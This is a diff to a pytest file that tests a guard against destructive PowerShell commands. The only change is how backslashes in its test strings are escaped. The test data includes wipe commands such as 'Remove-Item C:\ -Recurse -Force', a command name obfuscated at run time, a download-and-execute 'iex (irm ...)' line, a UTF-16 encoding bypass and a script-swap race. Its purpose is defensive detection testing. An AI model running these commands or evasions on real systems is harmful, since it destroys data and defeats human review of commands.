@@ -196,7 +196,7 @@ def test_a_utf16_script_is_judged_on_what_powershell_will_actually_run(tmp_path,
     一致せず、PowerShell は認識して実行する。承認したテキストと実行されるテキストが
     別物だった、という当の欠陥。"""
     script = tmp_path / "attack.ps1"
-    script.write_bytes("Remove-Item -Recurse -Force C:\target\*\n".encode("utf-16"))
+    script.write_bytes("Remove-Item -Recurse -Force C:\\target\\*\n".encode("utf-16"))
     raw = script.read_bytes()
     assert not CG.destructive_shell(raw.decode("utf-8", "replace")), "前提が変わった"
     assert CG.destructive_shell(SE._decode_script(raw)), "UTF-16 のまま素通りする"
@@ -228,7 +228,7 @@ def test_the_bytes_approved_are_the_bytes_executed(tmp_path, monkeypatch):
 
     def _fake_run(cmd, **kw):
         # swap the original AFTER the read, BEFORE the run -- the classic interleaving
-        script.write_text("Remove-Item C:\ -Recurse -Force\n", encoding="utf-8")
+        script.write_text("Remove-Item C:\\ -Recurse -Force\n", encoding="utf-8")
         executed = [a for a in cmd if str(a).endswith(".ps1")][0]
         seen["executed_body"] = open(executed, encoding="utf-8").read()
         seen["was_the_original"] = str(executed) == str(script)
@@ -272,8 +272,8 @@ def test_the_trace_never_writes_a_credential():
 @pytest.mark.parametrize("cmd", [
     "del $PROFILE",                                    # `del` IS Remove-Item, no flags needed
     "Stop-Process -Name sqlservr -Force",
-    "& ('Remove-'+'Item') 'C:\target\*' -Recurse -Force",   # name built at run time
-    "rd /s C:\data",
+    "& ('Remove-'+'Item') 'C:\\target\\*' -Recurse -Force",   # name built at run time
+    "rd /s C:\\data",
     "$a = 'http://x/a'; iex (irm $a)",
 ])
 def test_the_second_reviews_misses_are_caught(cmd):
